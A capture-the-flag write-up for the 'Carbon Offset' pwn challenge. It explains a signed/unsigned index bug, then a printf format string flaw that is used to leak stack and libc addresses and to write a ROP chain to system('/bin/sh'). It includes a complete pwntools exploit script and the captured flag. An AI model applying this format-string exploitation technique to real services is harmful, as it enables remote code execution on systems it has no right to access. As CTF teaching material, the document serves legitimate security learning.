# Carbon Offset

## Challenge

We're given a binary and a Dockerfile.

The binary allows us to create, view, edit, and delete flights.
There is also a checkout function, which asks for some more information, then deletes all existing flights.

## Red Herring

Creating a flight adds the flight to the first empty slot in the array, then increments the number of flights by 1.

Deleting a flight removes a flight from any index that is less than the current number of flights, then decrements the number of flights by 1.

You can modify flights at any index less than the current number of flights.
Interestingly, the modify function uses an unsigned comparison for this, while most other checks use a signed comparison.

This means you can access out of bounds indices if you can call modify while the number of flights is negative.

You can achieve a negative number of flights by creating at least 3 flights, then freeing index 0 twice.
This will result in the number of flights being 1, even though there are 2 flights remaining in indices 1 and 2.
Now, if we call checkout, this will free the remaining 2 flights, giving us a total of -1 flights.
We can now modify a flight at indices greater than normally allowed.

Unfortunately, our range is still fairly limited because the index is passed as a 32-bit integer.
This means we cannot access lower addresses or dynamic shared objects.

Without more bugs, this was not exploitable.

## Solution

There is a format string vulnerability in the checkout function, as it passes the user's name as the first argument to printf.

The name is stored on heap, so we cannot add our own addresses on the stack for arbitrary writes.
Instead, we can manipulate existing stack pointers, usually storing RBP values, to write values to the stack.

By modifying the lower bytes of an RBP, we can write a ropchain one word at a time.

When writing our ropchain, we noticed the previous values we had written were being cleared.
We worked around this by reversing the order in which we wrote our ropchain.
This worked and we were able to spawn a shell.

It turns out that the main loop had been setting a stack variable to 0.
This stack variable was located at RBP-4, which always happened to be the previously written value, as we were editting RBP as part of the writing process.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 152.96.7.2 --port 1337 carbon_offset
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('carbon_offset')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '152.96.7.51'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x555555554000+0x1aa8
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

libc = ELF("libc.so.6")

def add_flight(depart=b'a', destination=b'a', date=b'a', price=1):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b':\n', depart)
    io.sendlineafter(b':\n', destination)
    io.sendlineafter(b':\n', date)
    io.sendlineafter(b':\n', str(price).encode())

def show_flights():
    io.sendlineafter(b'> ', b'2')
    return io.recvuntil(b'|---------------------------------------------------|\n\n')

def remove_flight(index):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'?\n', str(index).encode())

def modify_flight(index, depart=b'a', destination=b'a', date=b'a', price=1):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'?\n', str(index).encode())
    io.sendlineafter(b':\n', depart)
    io.sendlineafter(b':\n', destination)
    io.sendlineafter(b':\n', date)
    io.sendlineafter(b':\n', str(price).encode())

def checkout(name=b'a', street=b'a', zipcode=1, city=b'a', country=b'a'):
    io.sendlineafter(b'> ', b'5')
    io.sendlineafter(b':\n', name)
    io.sendlineafter(b':\n', street)
    io.sendlineafter(b':\n', str(zipcode).encode())
    io.sendlineafter(b':\n', city)
    io.sendlineafter(b':\n', country)
    return io.recvuntil(b'|------------------------------------------------------------|\n\n')

def menu_exit():
    io.sendlineafter(b'> ', b'6')

io = start()

# get negative num_flights
"""
add_flight()
add_flight()
add_flight()
add_flight()
remove_flight(0)
remove_flight(0)
remove_flight(0)
checkout()
"""

"""
modify_flight(0xfffffff8)

flight_array = exe.address + 0x4080
offset = (exe.got['stdout'] - flight_array) % (2**64)
index = offset >> 3
print(hex(offset))
print(index)
"""

def extract(raw):
    return (raw
        .replace(b"\n\nThank you for offseting your flights with us ", b'')
        .split(b"!\n|------------------------------------------------------------|\n")[0])

add_flight()
stack = int(extract(checkout(name=b"%8$p")), 0)
io.info("STACK : " + hex(stack))

add_flight()
libc.address = int(extract(checkout(name=b"%17$p")), 0) - libc.libc_start_main_return
io.info("LIBC : " + hex(libc.address))

add_flight()
print(hex(int(extract(checkout(name=b"%12$p")), 0)))

def write_word(offset, word):
    add_flight()
    checkout(name=f"%{(stack + 0x28 + offset) % 0x10000}c%8$hn".encode())

    add_flight()

    print(hex(u16(word)))
    if u16(word) == 0:
        name = f"%12$hn".encode()
    else:
        name = f"%{u16(word)}c%12$hn".encode()
    print(name)
    add_flight()
    checkout(name=name)

    add_flight()

rop = ROP(libc)
rop.raw(rop.ret)
rop.system(next(libc.search(b'/bin/sh')))
print(rop.dump())

for i in reversed(range(0, len(rop.chain()), 2)):
    write_word(i, rop.chain()[i:i+2])

menu_exit()

io.interactive()
```

## Flag

```
HL{624b54c8-343e-45a2-a856-c970ffcee148}
```
